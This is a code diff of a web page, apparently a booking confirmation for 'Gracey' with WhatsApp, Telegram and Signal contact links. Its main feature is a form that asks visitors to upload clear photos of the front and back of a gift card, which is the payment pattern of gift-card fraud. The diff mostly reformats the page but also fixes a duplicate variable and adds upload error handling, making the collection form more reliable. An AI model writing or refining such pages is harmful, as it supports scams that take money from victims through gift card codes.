@@ -68,6 +68,7 @@
     .back-home:hover {
       text-decoration: underline;
     }
+
     #gift-card-upload {
       background-color: #f9f9f9;
       padding: 2rem;
@@ -76,48 +77,46 @@
       max-width: 600px;
       margin: 2rem auto;
       font-family: Arial, sans-serif;
-   }
+    }
 
-   #gift-card-upload h2 {
-     
-    margin-bottom: 0.5rem;
-    font-size: 1.5rem;
-    color: #222;
-  }
+    #gift-card-upload h2 {
+      margin-bottom: 0.5rem;
+      font-size: 1.5rem;
+      color: #222;
+    }
 
-  #gift-card-upload p {
-    margin-bottom: 1.2rem;
-    color: #444;
-    font-size: 1rem;
-  }
+    #gift-card-upload p {
+      margin-bottom: 1.2rem;
+      color: #444;
+      font-size: 1rem;
+    }
 
-  #gift-card-upload input[type="file"] {
-    padding: 6px;
-    margin-bottom: 1rem;
-    width: 100%;
-    border: 1px solid #ccc;
-    border-radius: 6px;
-  }
+    #gift-card-upload input[type="file"] {
+      padding: 6px;
+      margin-bottom: 1rem;
+      width: 100%;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
 
-  #gift-card-upload button {
-    padding: 10px 20px;
-    background-color: #0077cc;
-    color: white;
-    border: none;
-    border-radius: 6px;
-    cursor: pointer;
-    font-weight: bold;
-}
+    #gift-card-upload button {
+      padding: 10px 20px;
+      background-color: #0077cc;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
 
- #gift-card-upload button:hover {
-    background-color: #005fa3;
- }
+    #gift-card-upload button:hover {
+      background-color: #005fa3;
+    }
 
- #uploadStatus {
-   
-  margin-top: 1rem;
-  font-weight: bold;
- }
+    #uploadStatus {
+      margin-top: 1rem;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
@@ -132,23 +131,24 @@
     <a id="signalLink" class="signal" target="_blank">Signal</a>
     <a id="zangiLink" class="zangi" target="_blank">Zangi</a>
   </div>
-  <section id="gift-card-upload" style="margin-top: 2rem;">
-  <h2>Upload Your Gift Card</h2>
-  <p>Please upload clear images of the front and back of your gift card. <strong>Make sure the image is clear and readable.</strong></p>
-  
-  <form id="giftCardForm" enctype="multipart/form-data">
-    <input type="hidden" name="booking_id" id="booking_id" value="">
-    
-    <label>Front of Gift Card:</label><br>
-    <input type="file" name="front_card" accept="image/*" required><br><br>
-    
-    <label>Back of Gift Card:</label><br>
-    <input type="file" name="back_card" accept="image/*" required><br><br>
-    
-    <button type="submit">Submit Gift Card</button>
-  </form>
 
-  <p id="uploadStatus"></p>
+  <section id="gift-card-upload">
+    <h2>Upload Your Gift Card</h2>
+    <p>Please upload clear images of the front and back of your gift card. <strong>Make sure the image is clear and readable.</strong></p>
+    
+    <form id="giftCardForm" enctype="multipart/form-data">
+      <input type="hidden" name="booking_id" id="booking_id" value="">
+      
+      <label>Front of Gift Card:</label><br>
+      <input type="file" name="front_card" accept="image/*" required><br><br>
+      
+      <label>Back of Gift Card:</label><br>
+      <input type="file" name="back_card" accept="image/*" required><br><br>
+      
+      <button type="submit">Submit Gift Card</button>
+    </form>
+
+    <p id="uploadStatus"></p>
   </section>
 
   <a class="back-home" href="/">← Back to Homepage</a>
@@ -156,14 +156,13 @@
   <script>
     const params = new URLSearchParams(window.location.search);
     const bookingId = params.get("booking_id") || "Unavailable";
+
     document.getElementById("bookingId").innerText = bookingId;
+    document.getElementById("booking_id").value = bookingId;
 
     const message = `Hello Gracey, I just made a booking. My booking ID is: ${bookingId}`;
-
-    // Encode message for URLs
     const encoded = encodeURIComponent(message);
 
-    // Set links with encoded booking message
     document.getElementById("whatsappLink").href = `https://wa.me/19282019545?text=${encoded}`;
     document.getElementById("telegramLink").href = `https://t.me/Graceytherapy?text=${encoded}`;
     document.getElementById("signalLink").href = `https://signal.me/#p/+19282019545?text=${encoded}`;
@@ -174,30 +173,32 @@
         alert("Booking info copied to clipboard!");
       });
     }
-  // Auto-fill booking ID from URL param (if it's in ?booking_id=XYZ)
-  const urlParams = new URLSearchParams(window.location.search);
-  const bookingId = urlParams.get('booking_id');
-  if (bookingId) {
-    document.getElementById('booking_id').value = bookingId;
-  }
 
-  document.getElementById("giftCardForm").addEventListener("submit", async function(e) {
-    e.preventDefault();
-    
-    const form = e.target;
-    const formData = new FormData(form);
+    document.getElementById("giftCardForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+      
+      const form = e.target;
+      const formData = new FormData(form);
+      const status = document.getElementById("uploadStatus");
 
-    const response = await fetch("/api/upload-gift-card", {
-      method: "POST",
-      body: formData
+      status.innerText = "Uploading...";
+      try {
+        const response = await fetch("/api/upload-gift-card", {
+          method: "POST",
+          body: formData
+        });
+
+        if (response.ok) {
+          status.innerText = "✅ Gift card uploaded successfully!";
+        } else {
+          const errText = await response.text();
+          status.innerText = "❌ Upload failed. Server said: " + errText;
+        }
+      } catch (err) {
+        console.error(err);
+        status.innerText = "❌ Upload failed. Check your internet or try again.";
+      }
     });
-
-    if (response.ok) {
-      document.getElementById("uploadStatus").innerText = "Gift card uploaded successfully!";
-    } else {
-      document.getElementById("uploadStatus").innerText = "There was an error uploading your gift card.";
-    }
-  });
   </script>
 </body>
-  </html>
+</html>
